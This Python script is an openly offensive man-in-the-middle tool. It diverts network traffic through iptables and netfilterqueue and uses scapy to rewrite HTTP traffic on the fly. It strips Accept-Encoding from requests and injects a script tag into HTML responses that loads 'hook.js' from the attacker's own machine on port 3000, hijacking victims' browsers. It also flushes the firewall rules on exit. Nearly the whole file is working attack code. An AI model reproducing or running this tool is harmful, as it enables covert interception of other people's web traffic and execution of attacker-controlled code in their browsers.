#!/root/anaconda3/envs/py2/bin/python  python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse
import re

local_computer_test = False


class NetSpoof(object):
    def __init__(self, main_layer, tcp_layer, filter_word, nice_replacement, replacement_list):
        self.check_arguments()
        if self.options.interface:
            self.interface = self.options.interface
        else:
            self.get_interface()
        if self.interface:
            self.spoof_ip = self.get_my_ip()
            self.main_layer = main_layer
            self.tcp_layer = tcp_layer
            self.filter_word = filter_word
            self.ack_list = set()
            self.dickens_bait = nice_replacement
            self.replacement_list = replacement_list
            self.replacement_list[1] = re.sub(
                r':(\d+)', self.get_my_ip().replace('\n','') + ':\g<1>', self.replacement_list[1])
            print(self.replacement_list[1])

    def check_arguments(self):
        parser = optparse.OptionParser()
        parser.add_option("-i", "--interface", dest="interface",
                          help="Interface name to work with it for spoofing.")

        (self.options, arguments) = parser.parse_args()
        return self.options

    def get_interface(self):
        machine_data = str(subprocess.check_output(
            r"ifconfig | sed 's/^\(.*\): /\1---\n/g' | sed 's/\s*\(ether.*\)/\1---/g' | sed -n '/.*---/p' | sed 's/---// g'", shell=True)).replace(r"b'", '').replace("'", '').split(r'\n')[:-1]

        start = 1
        relevant_interfaces = {}

        while start < len(machine_data):
            if 'ether' in machine_data[start]:
                relevant_interfaces[start] = machine_data[start - 1]
            start += 1

        print
        "\nThose are available interfaces:{relevant_interfaces}\nPlease choose the interface by index.Insert the number:"

        try:
            self.interface = relevant_interfaces[int(input())]
        except KeyError:
            print('Interface does not exist!!')
            return None
        return self.interface

    def get_my_ip(self):
        return str(subprocess.check_output(
            r"ip route  |  sed -n '/" + self.interface + ".*kernel/ p' | awk '{print $9; exit}'", shell=True)).replace("b'", '').replace(r"\n'", '')

    def set_load(self, packet, modified_load):
        packet[self.main_layer].load = modified_load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[self.tcp_layer].chksum
        # print(packet.show())
        return packet

    def modify_load(self, load, packet, mod_packet, mod_str, new_str):
        load = re.sub(mod_str, new_str, load)
        content_length_search = re.search("Content-Length:\s*(\d*)", load)

        if content_length_search and "text/html" in load:
            old_len = content_length_search.group(1)
            new_len = str((int(old_len) +
                           len(self.replacement_list[1])))
            load = load.replace(old_len, new_len)

        packet.set_payload(str(self.set_load(mod_packet, load)))

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(self.main_layer):
            load = scapy_packet[self.main_layer].load
            try:
                if scapy_packet[self.tcp_layer].dport == 80:
                    print("[+] Request")
                    self.modify_load(
                        load, packet, scapy_packet, self.dickens_bait, "")
                elif scapy_packet[self.tcp_layer].sport == 80:
                    print("[+] Response")
                    self.modify_load(
                        load, packet, scapy_packet, self.replacement_list[0], self.replacement_list[1] + self.replacement_list[0])
            except IndexError:
                pass

        packet.accept()


if __name__ == '__main__':

    if local_computer_test:
        subprocess.call(
            r'iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
        subprocess.call(
            r'iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    else:
        subprocess.call(
            r'iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    try:
        sp_obj = NetSpoof(scapy.Raw, scapy.TCP, ".exe",
                          "Accept-Encoding:.*?\\r\\n", ["</body>", '<script src="http://:3000/hook.js"></script>'])
        # sp_obj = NetSpoof(scapy.Raw, scapy.TCP, ".exe",
        #                   "Accept-Encoding:.*?\\r\\n", ["</body>", '<script>alert("test");</script>'])
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, sp_obj.process_packet)
        queue.run()
    except KeyboardInterrupt:
        subprocess.call(r'iptables --flush', shell=True)
